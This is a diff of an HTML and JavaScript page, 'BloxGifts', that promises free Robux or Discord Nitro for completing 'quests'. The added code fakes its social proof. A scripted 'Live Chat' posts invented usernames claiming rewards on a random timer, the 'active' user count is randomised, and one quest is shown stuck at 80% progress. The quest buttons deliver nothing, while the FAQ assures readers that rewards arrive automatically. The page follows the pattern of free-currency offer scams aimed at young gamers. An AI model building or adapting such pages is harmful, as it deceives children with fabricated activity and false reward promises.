@@ -1,128 +1,656 @@
-
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-
 <head>
-  <meta charset="UTF-8" />
-  <link rel="manifest" href="./site.webmanifest" />
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BloxGifts - Earn Robux for completing easy quests!</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+  font-family:'Inter',sans-serif;
+  min-height:100vh;
+  overflow:hidden;
+  position:relative;
+  background:#111;
+}
 
-  <title>BloxGifts - Earn Robux for completing easy quests!</title>
+/* BACKGROUND */
+.bg{
+  position:fixed;inset:0;
+  background:radial-gradient(ellipse at 20% 50%, rgba(180,40,40,0.7) 0%, transparent 55%),
+             radial-gradient(ellipse at 80% 30%, rgba(220,80,40,0.5) 0%, transparent 45%),
+             radial-gradient(ellipse at 60% 80%, rgba(160,30,30,0.6) 0%, transparent 50%),
+             #1a0000;
+  z-index:0;
+  filter:blur(0px);
+}
+.bg-boxes{
+  position:fixed;inset:0;z-index:1;
+  background-image:
+    radial-gradient(circle at 15% 70%, rgba(200,50,50,0.4) 0%, transparent 30%),
+    radial-gradient(circle at 85% 60%, rgba(230,100,30,0.3) 0%, transparent 25%);
+}
 
-  <link rel="icon" type="image/png" href="./favicon-96x96.png" sizes="96x96" />
-  <link rel="shortcut icon" href="./favicon.ico" />
-  <link rel="apple-touch-icon" sizes="180x180" href="./apple-touch-icon.png" />
-  <meta name="apple-mobile-web-app-title" content="BloxGifts" />
+/* SNOWFLAKES */
+.snow-container{position:fixed;inset:0;z-index:2;pointer-events:none;overflow:hidden}
+.snowflake{
+  position:absolute;top:-20px;color:#fff;font-size:12px;opacity:0.7;
+  animation:fall linear infinite;user-select:none;
+}
+@keyframes fall{
+  0%{transform:translateY(-20px) rotate(0deg);opacity:0.8}
+  100%{transform:translateY(110vh) rotate(360deg);opacity:0}
+}
 
-  <meta name="twitter:card" content="summary_large_image" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <meta name="robots" content="index, follow" />
-  <meta name="language" content="multilingual" />
-  <meta property="og:locale" content="en_US" />
-  <meta property="og:type" content="website" />
+/* LANGUAGE SELECTOR */
+.lang-sel{
+  position:fixed;bottom:24px;left:24px;z-index:100;
+  display:flex;align-items:center;gap:8px;
+  background:#fff;border:1px solid #ddd;border-radius:8px;
+  padding:8px 14px;font-size:14px;font-weight:500;color:#222;
+  cursor:pointer;box-shadow:0 2px 8px rgba(0,0,0,0.15);
+}
+.lang-sel img{width:20px;height:14px;border-radius:2px}
 
-  <meta property="og:title" content="BloxGifts - Earn Robux for completing easy quests!" />
-  <meta name="twitter:title" content="BloxGifts - Earn Robux for completing easy quests!" />
+/* ROBLOX CHARACTER */
+.roblox-char{
+  position:fixed;top:0;left:50%;transform:translateX(-50%);
+  z-index:10;pointer-events:none;
+  width:120px;height:180px;
+  display:flex;align-items:flex-start;justify-content:center;
+}
+.char-img{
+  width:110px;height:170px;
+  object-fit:contain;
+  filter:drop-shadow(0 4px 16px rgba(0,0,0,0.5));
+}
+/* Fallback character drawn in CSS */
+.char-fallback{
+  width:80px;height:150px;position:relative;margin-top:10px;
+}
+.char-head{
+  width:44px;height:40px;background:#ffcc99;border-radius:4px;
+  margin:0 auto;position:relative;border:2px solid #e6b07a;
+}
+.char-head::after{
+  content:'😊';position:absolute;top:50%;left:50%;
+  transform:translate(-50%,-50%);font-size:20px;
+}
+.char-hat{
+  width:50px;height:22px;background:#f5c518;border-radius:4px 4px 0 0;
+  margin:0 auto;position:relative;top:2px;
+  border:2px solid #d4a017;
+}
+.char-hat::before{
+  content:'$';position:absolute;top:2px;left:50%;transform:translateX(-50%);
+  font-size:14px;font-weight:800;color:#fff;
+}
+.char-body{
+  width:48px;height:55px;background:#2d6a2d;border-radius:4px;
+  margin:0 auto;border:2px solid #1e4e1e;
+}
+.char-legs{display:flex;justify-content:center;gap:4px;margin-top:2px}
+.char-leg{width:18px;height:40px;background:#1a3a8f;border-radius:0 0 4px 4px;border:2px solid #122b6e}
 
-  <meta name="author" content="BloxGifts" />
-  <meta property="og:site_name" content="BloxGifts" />
-  <meta name="application-name" content="BloxGifts" />
+/* MAIN LAYOUT */
+.main{
+  position:relative;z-index:5;
+  display:flex;align-items:flex-start;justify-content:center;
+  gap:20px;padding:130px 20px 40px;
+  min-height:100vh;
+}
 
-  <meta name="description"
-    content="BloxGifts is a platform where you can complete quests to earn Robux. Safe, legitimate, and trusted by thousands of Roblox players." />
-  <meta property="og:description"
-    content="BloxGifts is a platform where you can complete quests to earn Robux. Safe, legitimate, and trusted by thousands of Roblox players." />
-  <meta name="twitter:description"
-    content="BloxGifts is a platform where you can complete quests to earn Robux. Safe, legitimate, and trusted by thousands of Roblox players." />
+/* PANELS */
+.panel{
+  background:rgba(255,255,255,0.97);
+  border-radius:16px;
+  padding:0;
+  overflow:hidden;
+  box-shadow:0 8px 40px rgba(0,0,0,0.4);
+  flex-shrink:0;
+}
 
-  <meta property="og:url" content="https://blox.gifts/" />
-  <meta name="twitter:url" content="https://blox.gifts/" />
-  <link rel="canonical" href="https://blox.gifts/" />
-  <link rel="alternate" hreflang="x-default" href="https://blox.gifts/" />
+/* HELP PANEL */
+.help-panel{width:310px}
+.help-header{
+  display:flex;align-items:center;gap:12px;
+  padding:18px 20px;border-bottom:1px solid #f0f0f0;
+}
+.help-icon{
+  width:36px;height:36px;background:#3b5bdb;border-radius:8px;
+  display:flex;align-items:center;justify-content:center;
+  font-size:18px;color:#fff;flex-shrink:0;
+}
+.help-header h2{font-size:16px;font-weight:700;color:#111;margin-bottom:2px}
+.help-header p{font-size:12px;color:#888;font-weight:400}
+.faq-item{border-bottom:1px solid #f0f0f0;cursor:pointer}
+.faq-item:last-child{border-bottom:none}
+.faq-q{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:14px 20px;font-size:14px;font-weight:500;color:#222;
+  transition:background .15s;user-select:none;
+}
+.faq-q:hover{background:#f9f9f9}
+.faq-chevron{font-size:12px;color:#aaa;transition:transform .2s;flex-shrink:0}
+.faq-chevron.open{transform:rotate(180deg)}
+.faq-a{
+  display:none;padding:0 20px 14px;
+  font-size:13px;color:#555;line-height:1.6;
+}
+.faq-a.open{display:block}
 
-  <meta name="keywords" content="roblox, robux, rewards, free robux, blox.gifts" />
+/* CENTER PANEL */
+.center-panel{width:400px;background:rgba(255,255,255,0.97)}
+.panel-avatar{
+  display:flex;justify-content:center;
+  position:relative;top:-36px;margin-bottom:-28px;
+}
+.avatar-ring{
+  width:64px;height:64px;border-radius:50%;
+  background:linear-gradient(135deg,#ff6b6b,#a855f7,#3b82f6);
+  padding:3px;
+  box-shadow:0 2px 12px rgba(0,0,0,0.2);
+}
+.avatar-inner{
+  width:100%;height:100%;border-radius:50%;
+  background:#fff;display:flex;align-items:center;justify-content:center;
+  font-size:28px;
+}
 
-  <meta property="og:image" content="https://blox.gifts/og-image.png" />
-  <meta property="og:image:width" content="1920" />
-  <meta property="og:image:height" content="640" />
-  <meta property="og:image:alt" content="BloxGifts - Earn Robux for completing easy quests! " />
+/* REWARD SCREEN */
+.reward-screen{padding:24px 28px 32px;text-align:center;display:none}
+.reward-screen.active{display:block}
+.reward-screen h2{font-size:24px;font-weight:800;color:#111;margin-bottom:8px;letter-spacing:-0.5px}
+.reward-screen .subtitle{font-size:14px;color:#666;margin-bottom:28px}
+.reward-cards{display:flex;gap:16px;justify-content:center}
+.reward-card{
+  flex:1;border:2px solid #e5e5e5;border-radius:12px;padding:20px 16px;
+  cursor:pointer;transition:all .2s;text-align:center;
+  background:#fff;max-width:160px;
+}
+.reward-card:hover{border-color:#22c55e;transform:translateY(-2px);box-shadow:0 6px 20px rgba(0,0,0,0.1)}
+.reward-card.selected{border-color:#22c55e;background:#f0fdf4}
+.reward-icon{font-size:48px;margin-bottom:12px;display:block}
+.reward-card h3{font-size:16px;font-weight:700;color:#111;margin-bottom:4px}
+.reward-card p{font-size:12px;color:#888;line-height:1.4}
+/* Robux gold icon */
+.robux-icon{
+  width:60px;height:60px;background:linear-gradient(135deg,#c8940a,#f5c518);
+  border-radius:50%;display:flex;align-items:center;justify-content:center;
+  margin:0 auto 12px;box-shadow:0 2px 8px rgba(200,148,10,0.4);
+  border:3px solid #d4a017;
+}
+.robux-icon svg{width:30px;height:30px;fill:#fff}
+/* Nitro icon */
+.nitro-icon{
+  width:60px;height:60px;background:linear-gradient(135deg,#5865f2,#9b59b6);
+  border-radius:12px;display:flex;align-items:center;justify-content:center;
+  margin:0 auto 12px;box-shadow:0 2px 8px rgba(88,101,242,0.4);
+  border:3px solid #4752c4;
+}
+.nitro-icon svg{width:30px;height:30px;fill:#fff}
 
-  <meta name="twitter:image" content="https://blox.gifts/og-image.png" />
-  <meta name="twitter:image:width" content="1920" />
-  <meta name="twitter:image:height" content="640" />
-  <meta name="twitter:image:alt" content="BloxGifts - Earn Robux for completing easy quests!" />
+/* QUEST SCREEN */
+.quest-screen{padding:24px 28px 28px;text-align:center;display:none}
+.quest-screen.active{display:block}
+.quest-screen h2{font-size:22px;font-weight:800;color:#111;margin-bottom:8px}
+.quest-screen .subtitle{font-size:13px;color:#666;margin-bottom:20px;line-height:1.5}
+.quest-screen .subtitle b{color:#111}
+.quest-btn{
+  display:block;width:100%;padding:15px 20px;
+  background:#22c55e;color:#fff;
+  border:none;border-radius:8px;cursor:pointer;
+  font-size:15px;font-weight:600;font-family:'Inter',sans-serif;
+  margin-bottom:8px;transition:background .15s;text-align:center;
+  text-decoration:none;position:relative;
+}
+.quest-btn:hover{background:#16a34a}
+.quest-btn.loading{
+  background:#16a34a;
+  padding-right:40px;
+}
+.quest-btn .spinner{
+  position:absolute;right:14px;top:50%;transform:translateY(-50%);
+  width:18px;height:18px;border:2px solid rgba(255,255,255,0.3);
+  border-top-color:#fff;border-radius:50%;
+  animation:spin .7s linear infinite;display:none;
+}
+.quest-btn.loading .spinner{display:block}
+@keyframes spin{to{transform:translateY(-50%) rotate(360deg)}}
+.progress-bar-wrap{
+  margin:4px 0 2px;height:4px;background:#e5e5e5;border-radius:2px;overflow:hidden;
+}
+.progress-bar-fill{height:100%;background:#22c55e;border-radius:2px}
+.progress-label{font-size:11px;color:#aaa;text-align:left;margin-bottom:8px}
 
-  <meta name="theme-color" content="#a92027" data-react-helmet="true" />
-  <meta name="color-scheme" content="light" />
-  <meta name="mobile-web-app-capable" content="yes" />
-  <meta name="apple-mobile-web-app-capable" content="yes" />
-  <meta name="apple-mobile-web-app-status-bar-style" content="default" />
+/* BOTTOM CONTROLS */
+.panel-bottom{
+  display:flex;align-items:center;justify-content:center;
+  gap:16px;padding:12px 20px;
+  border-top:1px solid #f0f0f0;
+}
+.panel-btn-icon{
+  width:36px;height:36px;border-radius:50%;background:#f0f0f0;
+  display:flex;align-items:center;justify-content:center;
+  cursor:pointer;font-size:16px;transition:background .15s;border:none;
+}
+.panel-btn-icon:hover{background:#e0e0e0}
 
-  <meta name="rating" content="general" />
-  <meta http-equiv="content-language" content="en" />
+/* LIVE CHAT PANEL */
+.chat-panel{width:310px}
+.chat-header{
+  display:flex;align-items:center;justify-content:space-between;
+  padding:16px 20px;border-bottom:1px solid #f0f0f0;
+}
+.chat-header-left{display:flex;align-items:center;gap:10px}
+.chat-icon{
+  width:36px;height:36px;background:#00b894;border-radius:8px;
+  display:flex;align-items:center;justify-content:center;font-size:16px;
+}
+.chat-header h2{font-size:15px;font-weight:700;color:#111;margin-bottom:2px}
+.chat-header p{font-size:12px;color:#888}
+.active-dot{
+  display:flex;align-items:center;gap:5px;
+  font-size:12px;font-weight:600;color:#22c55e;
+}
+.active-dot::before{
+  content:'';width:7px;height:7px;background:#22c55e;
+  border-radius:50%;display:block;
+  box-shadow:0 0 6px #22c55e;
+}
+.chat-messages{
+  height:340px;overflow-y:auto;padding:12px 16px;
+  display:flex;flex-direction:column;gap:5px;
+  scrollbar-width:thin;scrollbar-color:#ddd transparent;
+}
+.chat-messages::-webkit-scrollbar{width:4px}
+.chat-messages::-webkit-scrollbar-thumb{background:#ddd;border-radius:2px}
+.chat-msg{font-size:13px;color:#444;line-height:1.5}
+.chat-msg .username{font-weight:700;color:#00b894;cursor:pointer}
+.chat-msg .username:hover{text-decoration:underline}
+.chat-msg .action{color:#666}
+.chat-msg .reward-type{font-weight:700;color:#ff6b35}
+.chat-msg .reward-robux{font-weight:700;color:#f5c518}
+.chat-input-wrap{
+  display:flex;align-items:center;gap:8px;
+  padding:12px 16px;border-top:1px solid #f0f0f0;
+}
+.chat-input{
+  flex:1;border:none;outline:none;font-size:13px;color:#999;
+  font-family:'Inter',sans-serif;background:transparent;cursor:not-allowed;
+}
+.chat-lock{font-size:16px;color:#ccc}
 
-  <script type="application/ld+json">
-      {
-        "@context": "https://schema.org",
-        "@type": "WebSite",
-        "@id": "https://blox.gifts/",
-        "url": "https://blox.gifts/",
-        "name": "BloxGifts",
-        "publisher": {
-          "@id": "https://blox.gifts/"
-        }
-      }
-    </script>
-
-  <script type="application/ld+json">
-      {
-        "@context": "https://schema.org",
-        "@type": "WebPage",
-        "@id": "https://blox.gifts/",
-        "url": "https://blox.gifts/",
-        "name": "BloxGifts - Earn Robux for completing easy quests!",
-        "isPartOf": {
-          "@id": "https://blox.gifts/"
-        },
-        "description": "BloxGifts is a platform where you can complete quests to earn Robux. Safe, legitimate, and trusted by thousands of Roblox players.",
-        "inLanguage": "x-default",
-        "primaryImageOfPage": {
-          "@type": "ImageObject",
-          "url": "https://blox.gifts/og-image.png",
-          "width": 1920,
-          "height": 640
-        }
-      }
-    </script>
-
-  <script type="application/ld+json">
-      {
-        "@context": "https://schema.org",
-        "@type": "Organization",
-        "@id": "https://blox.gifts/",
-        "name": "BloxGifts",
-        "url": "https://blox.gifts/",
-        "logo": {
-          "@type": "ImageObject",
-          "url": "https://blox.gifts/favicon-96x96.png",
-          "width": 96,
-          "height": 96
-        }
-      }
-    </script>
-  <script defer src="https://cloud.umami.is/script.js" data-website-id="529e01ee-ce2f-4f8b-a67c-26223414e5d6"></script>
-  <script type="module" crossorigin src="./cdc03e.js"></script>
-  <link rel="stylesheet" crossorigin href="./5aee6c.css">
+/* USERNAME MODAL */
+.modal-overlay{
+  position:fixed;inset:0;z-index:200;
+  background:rgba(0,0,0,0.5);backdrop-filter:blur(4px);
+  display:flex;align-items:center;justify-content:center;
+  display:none;
+}
+.modal-overlay.active{display:flex}
+.modal{
+  background:#fff;border-radius:16px;padding:32px;width:360px;
+  box-shadow:0 20px 60px rgba(0,0,0,0.3);text-align:center;
+}
+.modal h3{font-size:20px;font-weight:800;color:#111;margin-bottom:8px}
+.modal p{font-size:14px;color:#666;margin-bottom:24px;line-height:1.6}
+.modal input{
+  width:100%;padding:12px 16px;border:2px solid #e5e5e5;border-radius:8px;
+  font-size:15px;font-family:'Inter',sans-serif;outline:none;margin-bottom:16px;
+  transition:border-color .2s;
+}
+.modal input:focus{border-color:#22c55e}
+.modal-btn{
+  width:100%;padding:13px;background:#22c55e;color:#fff;
+  border:none;border-radius:8px;font-size:15px;font-weight:700;
+  font-family:'Inter',sans-serif;cursor:pointer;transition:background .15s;
+}
+.modal-btn:hover{background:#16a34a}
+.modal-skip{
+  display:block;margin-top:12px;font-size:13px;color:#aaa;
+  cursor:pointer;text-decoration:underline;
+}
+.modal-skip:hover{color:#888}
+</style>
 </head>
-
 <body>
-  <div id="root"></div>
 
-  <noscript>
-      <h1>Please enable JavaScript in order to use this website.</h1>
-  </noscript>
-<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"4a1fc672c70d49acaf771c0c5e45afbb","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+<!-- BACKGROUND -->
+<div class="bg"></div>
+<div class="bg-boxes"></div>
+
+<!-- SNOWFLAKES -->
+<div class="snow-container" id="snow"></div>
+
+<!-- ROBLOX CHARACTER -->
+<div class="roblox-char">
+  <div class="char-fallback">
+    <div class="char-hat"></div>
+    <div class="char-head"></div>
+    <div class="char-body"></div>
+    <div class="char-legs">
+      <div class="char-leg"></div>
+      <div class="char-leg"></div>
+    </div>
+  </div>
+</div>
+
+<!-- MAIN LAYOUT -->
+<div class="main">
+
+  <!-- HELP PANEL -->
+  <div class="panel help-panel">
+    <div class="help-header">
+      <div class="help-icon">?</div>
+      <div>
+        <h2>Help</h2>
+        <p>Have questions or issues?</p>
+      </div>
+    </div>
+
+    <div class="faq-item" onclick="toggleFaq(this)">
+      <div class="faq-q">
+        How do I use this?
+        <span class="faq-chevron">▾</span>
+      </div>
+      <div class="faq-a open">Select a reward. For Roblox rewards, enter your Roblox username. For Nitro rewards, no username is needed. Then complete one quest.</div>
+    </div>
+    <div class="faq-item" onclick="toggleFaq(this)">
+      <div class="faq-q">
+        How do I receive my prize?
+        <span class="faq-chevron">▾</span>
+      </div>
+      <div class="faq-a">After completing a quest, your reward is sent automatically. Robux appears in your account within minutes. Nitro is delivered via email.</div>
+    </div>
+    <div class="faq-item" onclick="toggleFaq(this)">
+      <div class="faq-q">
+        What if I can't complete a quest?
+        <span class="faq-chevron">▾</span>
+      </div>
+      <div class="faq-a">Just try another one! There are multiple quests available. If one doesn't work for you, another will. Contact support if you have ongoing issues.</div>
+    </div>
+    <div class="faq-item" onclick="toggleFaq(this)">
+      <div class="faq-q">
+        Why do I have to do a quest?
+        <span class="faq-chevron">▾</span>
+      </div>
+      <div class="faq-a">Completing quests is how we fund the rewards. Our partners pay us when you complete tasks, and we share that with you as Robux or Nitro.</div>
+    </div>
+    <div class="faq-item" onclick="toggleFaq(this)">
+      <div class="faq-q">
+        Can I claim more than once?
+        <span class="faq-chevron">▾</span>
+      </div>
+      <div class="faq-a">Each account can claim once every 24 hours. Complete more quests to increase your daily limit. Premium accounts get higher limits.</div>
+    </div>
+    <div class="faq-item" onclick="toggleFaq(this)">
+      <div class="faq-q">
+        Is this an official Roblox website?
+        <span class="faq-chevron">▾</span>
+      </div>
+      <div class="faq-a">No. This site is not affiliated with or endorsed by Roblox Corporation. We are an independent rewards platform.</div>
+    </div>
+  </div>
+
+  <!-- CENTER PANEL -->
+  <div class="panel center-panel" id="centerPanel">
+
+    <!-- AVATAR -->
+    <div class="panel-avatar">
+      <div class="avatar-ring">
+        <div class="avatar-inner">😊</div>
+      </div>
+    </div>
+
+    <!-- REWARD SELECTION SCREEN -->
+    <div class="reward-screen active" id="rewardScreen">
+      <h2>Choose Your Reward</h2>
+      <p class="subtitle">What do you want to earn today?</p>
+      <div class="reward-cards">
+        <div class="reward-card" id="robuxCard" onclick="selectReward('robux')">
+          <div class="robux-icon">
+            <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm-1-11h2v2h-2zm0 4h2v4h-2z"/></svg>
+          </div>
+          <h3>800 Robux</h3>
+          <p>Get 800 Robux instantly</p>
+        </div>
+        <div class="reward-card" id="nitroCard" onclick="selectReward('nitro')">
+          <div class="nitro-icon">
+            <svg viewBox="0 0 24 24"><path d="M13 3L4 14h7l-2 7 9-11h-7l2-7z"/></svg>
+          </div>
+          <h3>Nitro</h3>
+          <p>1 month of Discord Nitro</p>
+        </div>
+      </div>
+    </div>
+
+    <!-- QUEST SCREEN -->
+    <div class="quest-screen" id="questScreen">
+      <h2>Complete One Quest</h2>
+      <p class="subtitle">Choose and complete just 1 quest below to receive <b id="selectedRewardLabel">Robux</b> — If one doesn't work, try another!</p>
+
+      <button class="quest-btn" onclick="clickQuest(this)">
+        Click to get your bonus!
+        <span class="spinner"></span>
+      </button>
+      <button class="quest-btn" onclick="clickQuest(this)">
+        Odulunuzu talep etmek icin dokunun
+        <span class="spinner"></span>
+      </button>
+      <button class="quest-btn" onclick="clickQuest(this)">
+        Odulunuzu almak icin tiklayin!
+        <span class="spinner"></span>
+      </button>
+      <button class="quest-btn" onclick="clickQuest(this)">
+        Score more than 2 goals to unlock a special offer!
+        <span class="spinner"></span>
+      </button>
+      <div style="position:relative">
+        <button class="quest-btn loading" onclick="clickQuest(this)">
+          Pick the winning team and unlock a special offer!
+          <span class="spinner" style="display:block"></span>
+        </button>
+        <div class="progress-bar-wrap"><div class="progress-bar-fill" style="width:80%"></div></div>
+        <div class="progress-label">80%</div>
+      </div>
+    </div>
+
+    <div class="panel-bottom">
+      <button class="panel-btn-icon" title="Refresh" onclick="goBack()">↩</button>
+      <button class="panel-btn-icon" title="Refresh quests" onclick="refreshQuests()">🔄</button>
+    </div>
+  </div>
+
+  <!-- LIVE CHAT PANEL -->
+  <div class="panel chat-panel">
+    <div class="chat-header">
+      <div class="chat-header-left">
+        <div class="chat-icon">💬</div>
+        <div>
+          <h2>Live Chat</h2>
+          <p>Talk to other Players</p>
+        </div>
+      </div>
+      <div class="active-dot" id="activeCount">180 active</div>
+    </div>
+    <div class="chat-messages" id="chatMessages"></div>
+    <div class="chat-input-wrap">
+      <input class="chat-input" type="text" placeholder="Claim any prize to chat..." readonly>
+      <span class="chat-lock">🔒</span>
+    </div>
+  </div>
+
+</div>
+
+<!-- LANGUAGE SELECTOR -->
+<div class="lang-sel">
+  <span>🇬🇧</span>
+  <span>English</span>
+  <span>▾</span>
+</div>
+
+<!-- USERNAME MODAL -->
+<div class="modal-overlay" id="usernameModal">
+  <div class="modal">
+    <h3>Enter Your Roblox Username</h3>
+    <p>We'll send your <strong>800 Robux</strong> directly to your Roblox account after you complete a quest.</p>
+    <input type="text" id="usernameInput" placeholder="Your Roblox username" maxlength="20">
+    <button class="modal-btn" onclick="confirmUsername()">Continue →</button>
+    <span class="modal-skip" onclick="skipUsername()">Skip for now</span>
+  </div>
+</div>
+
+<script>
+// === SNOWFLAKES ===
+const snowContainer = document.getElementById('snow');
+for(let i=0;i<30;i++){
+  const flake = document.createElement('div');
+  flake.className = 'snowflake';
+  flake.textContent = '*';
+  flake.style.cssText = `
+    left:${Math.random()*100}%;
+    font-size:${8+Math.random()*10}px;
+    animation-duration:${5+Math.random()*10}s;
+    animation-delay:${Math.random()*10}s;
+    opacity:${0.4+Math.random()*0.5};
+  `;
+  snowContainer.appendChild(flake);
+}
+
+// === FAQ ===
+function toggleFaq(el){
+  const chevron = el.querySelector('.faq-chevron');
+  const answer = el.querySelector('.faq-a');
+  const isOpen = answer.classList.contains('open');
+  document.querySelectorAll('.faq-a').forEach(a=>a.classList.remove('open'));
+  document.querySelectorAll('.faq-chevron').forEach(c=>c.classList.remove('open'));
+  if(!isOpen){
+    answer.classList.add('open');
+    chevron.classList.add('open');
+  }
+}
+
+// === REWARD SELECTION ===
+let selectedReward = null;
+
+function selectReward(type){
+  selectedReward = type;
+  document.querySelectorAll('.reward-card').forEach(c=>c.classList.remove('selected'));
+  document.getElementById(type==='robux'?'robuxCard':'nitroCard').classList.add('selected');
+
+  setTimeout(()=>{
+    if(type==='robux'){
+      document.getElementById('usernameModal').classList.add('active');
+    } else {
+      showQuestScreen();
+    }
+  }, 300);
+}
+
+function confirmUsername(){
+  const val = document.getElementById('usernameInput').value.trim();
+  document.getElementById('usernameModal').classList.remove('active');
+  showQuestScreen();
+}
+
+function skipUsername(){
+  document.getElementById('usernameModal').classList.remove('active');
+  showQuestScreen();
+}
+
+function showQuestScreen(){
+  document.getElementById('rewardScreen').classList.remove('active');
+  document.getElementById('questScreen').classList.add('active');
+  const label = selectedReward==='robux'?'Robux':'Nitro';
+  document.getElementById('selectedRewardLabel').textContent = label;
+  document.querySelector('.panel-avatar').style.display='none';
+}
+
+function goBack(){
+  document.getElementById('rewardScreen').classList.add('active');
+  document.getElementById('questScreen').classList.remove('active');
+  document.querySelector('.panel-avatar').style.display='flex';
+}
+
+function refreshQuests(){
+  const btns = document.querySelectorAll('.quest-btn');
+  btns.forEach(b=>{
+    b.style.opacity='0.5';
+    setTimeout(()=>b.style.opacity='1',600);
+  });
+}
+
+function clickQuest(btn){
+  btn.classList.add('loading');
+  const sp = btn.querySelector('.spinner');
+  if(sp) sp.style.display='block';
+  // Simulate opening offer
+  setTimeout(()=>{
+    btn.classList.remove('loading');
+    if(sp) sp.style.display='none';
+  },3000);
+}
+
+// === LIVE CHAT ===
+const names = [
+  'ForgeBlaze8','Eagle_Tiger_3','MoonBlaze21','MoonNimbusHD2024','SparkLunar_9',
+  'FrostStormPlays99','Blaze_Echo21','ForgeSable8','PandaBlazeYT99','KnightBlaze8',
+  'BlazeEaglePro8','ViperStar11','GlitchNimbus8','SwiftQuest123','ProKnight21',
+  'Void_Retro9','PixelNovaYT2024','StarBlazer7','CosmicRex44','NeonFrost22',
+  'ShadowByte_X','TurboQuest5','LunarGrind99','ZeroGlitch8','RocketPanda3'
+];
+const rewards = ['Robux','Nitro','Robux','Robux','Nitro','Robux'];
+const actions = ['just claimed','just claimed','just earned'];
+
+function getRand(arr){return arr[Math.floor(Math.random()*arr.length)]}
+
+function addChatMessage(name, action, reward, msg){
+  const div = document.createElement('div');
+  div.className = 'chat-msg';
+  if(msg){
+    div.innerHTML = `<span class="username">${name}</span><span class="action">: ${msg}</span>`;
+  } else {
+    const cls = reward==='Robux'?'reward-robux':'reward-type';
+    div.innerHTML = `<span class="username">${name}</span> <span class="action">${action} </span><span class="${cls}">${reward}!</span>`;
+  }
+  const chat = document.getElementById('chatMessages');
+  chat.appendChild(div);
+  chat.scrollTop = chat.scrollHeight;
+  // Keep max 30 messages
+  while(chat.children.length>30) chat.removeChild(chat.firstChild);
+}
+
+// Initial messages
+const initialMsgs = [
+  {n:'ForgeBlaze8',r:'Robux'},{n:'Eagle_Tiger_3',r:'Robux'},
+  {n:'MoonBlaze21',r:'Nitro'},{n:'MoonNimbusHD2024',r:'Robux'},
+  {n:'SparkLunar_9',r:'Nitro'},{n:'FrostStormPlays99',r:'Robux'},
+  {n:'Blaze_Echo21',r:'Robux'},{n:'ForgeSable8',r:'Robux'},
+  {n:'PandaBlazeYT99',r:'Nitro'},{n:'KnightBlaze8',r:'Robux'},
+  {n:'BlazeEaglePro8',r:'Nitro'},
+];
+initialMsgs.forEach(m=>addChatMessage(m.n,'just claimed',m.r));
+
+// Add message from PixelNovaYT2024
+setTimeout(()=>addChatMessage('PixelNovaYT2024',null,null,'thanks'),500);
+
+// Auto messages
+setInterval(()=>{
+  const name = getRand(names);
+  const reward = getRand(rewards);
+  const action = getRand(actions);
+  addChatMessage(name,action,reward);
+}, 2200+Math.random()*2000);
+
+// Active count fluctuation
+let activeCount = 180;
+setInterval(()=>{
+  activeCount += Math.floor(Math.random()*7)-3;
+  activeCount = Math.max(150, Math.min(220, activeCount));
+  document.getElementById('activeCount').textContent = activeCount+' active';
+}, 5000);
+</script>
 </body>
-
 </html>
-
-<!-- © mahdi.gg -->
